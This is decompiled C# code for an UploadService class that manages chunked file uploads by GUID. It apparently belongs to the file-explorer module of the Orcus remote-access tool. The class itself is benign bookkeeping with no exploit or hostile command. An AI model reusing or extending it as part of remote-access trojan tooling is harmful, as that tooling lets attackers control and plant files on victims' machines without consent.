using System;
using System.Collections.Generic;
using Orcus.Shared.Commands.FileExplorer;

namespace Orcus.Commands.FileExplorer;

public class UploadService : IDisposable
{
	private readonly Dictionary<Guid, UploadProcess> _uploadProcesses;

	private readonly object _lockObject = new object();

	public UploadService()
	{
		_uploadProcesses = new Dictionary<Guid, UploadProcess>();
	}

	public Guid CreateNewUploadProcess(string path, byte[] hashValue, long length)
	{
		Guid guid = Guid.NewGuid();
		lock (_lockObject)
		{
			_uploadProcesses.Add(guid, new UploadProcess(path, hashValue, length));
			return guid;
		}
	}

	public void CancelUpload(Guid guid)
	{
		lock (_lockObject)
		{
			if (_uploadProcesses.TryGetValue(guid, out var value))
			{
				value.Failed();
				_uploadProcesses.Remove(guid);
			}
		}
	}

	public void ReceivePackage(Guid guid, byte[] bytes, int startIndex)
	{
		lock (_lockObject)
		{
			if (_uploadProcesses.TryGetValue(guid, out var value))
			{
				value.ReceiveData(bytes, startIndex);
			}
		}
	}

	public UploadResult FinishUpload(Guid guid)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		lock (_lockObject)
		{
			if (_uploadProcesses.TryGetValue(guid, out var value))
			{
				_uploadProcesses.Remove(guid);
				return value.FinishUpload();
			}
		}
		return (UploadResult)2;
	}

	public void Dispose()
	{
		lock (_lockObject)
		{
			foreach (KeyValuePair<Guid, UploadProcess> uploadProcess in _uploadProcesses)
			{
				uploadProcess.Value.Failed();
			}
			_uploadProcesses.Clear();
		}
	}
}
